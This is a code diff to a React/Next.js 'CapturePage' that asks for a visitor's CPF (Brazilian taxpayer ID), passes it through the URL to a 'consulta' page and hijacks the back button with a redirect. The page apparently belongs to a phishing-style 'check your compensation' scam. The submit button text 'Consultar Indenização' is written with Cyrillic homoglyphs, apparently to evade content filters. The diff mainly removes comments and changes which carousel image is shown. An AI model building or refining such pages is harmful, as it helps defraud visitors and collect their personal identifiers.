@@ -20,7 +20,7 @@ export default function CapturePage() {
 
   // Back button redirect logic
   useEffect(() => {
-    const urlBackRedirect = '../back/index.html'; // Or make this an absolute path if needed
+    const urlBackRedirect = '../back/index.html'; 
     const trimmedUrlBackRedirect = urlBackRedirect.trim() +
       (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
       document.location.search.replace('?', '').toString();
@@ -90,17 +90,13 @@ export default function CapturePage() {
       return;
     }
 
-    // Simulate delay and redirect
     setTimeout(() => {
         const newQueryParams = new URLSearchParams(window.location.search);
         newQueryParams.set('cpf', cpfValueRaw);
-        // Remove empty params as in original script (though 'cpf' won't be empty here)
         for (let [key, value] of newQueryParams.entries()) { if (!value.trim()) { newQueryParams.delete(key); } }
         
-        // Using /consulta/ as a base, adjust if your target is elsewhere in public or a different route
         window.location.href = (location.origin.endsWith('/') ? location.origin : location.origin + '/') + 'consulta/index.html?' + newQueryParams.toString();
-        // setIsSubmitting(false); // Not strictly needed due to redirect
-    }, 500); // Simulate network latency
+    }, 500);
   };
 
 
@@ -135,9 +131,9 @@ export default function CapturePage() {
 
       <div className="carousel">
         <div className="carousel-inner">
-          {carouselImages.length > 0 && (
+          {carouselImages.length > 1 && ( // Check if there's at least a second image
             <div className="carousel-item">
-              <Image src={carouselImages[0].src} alt={carouselImages[0].alt} width={720} height={300} data-ai-hint={carouselImages[0]['data-ai-hint']} priority />
+              <Image src={carouselImages[1].src} alt={carouselImages[1].alt} width={720} height={300} data-ai-hint={carouselImages[1]['data-ai-hint']} priority />
             </div>
           )}
         </div>
@@ -168,7 +164,6 @@ export default function CapturePage() {
               <button type="submit" id="submit-btn" disabled={isSubmitting}>
                 {isSubmitting ? 'Consultando...' : 'Соnsultаr Іndеnizаçãо'}
               </button>
-              {/* Hidden inputs for UTM can be added if statefully managed or passed via redirect if needed */}
             </form>
           </div>
           <h2 style={{ fontSize: '14px', marginTop: '30px', marginBottom: '0', display: 'flex', justifyContent: 'center' }}>
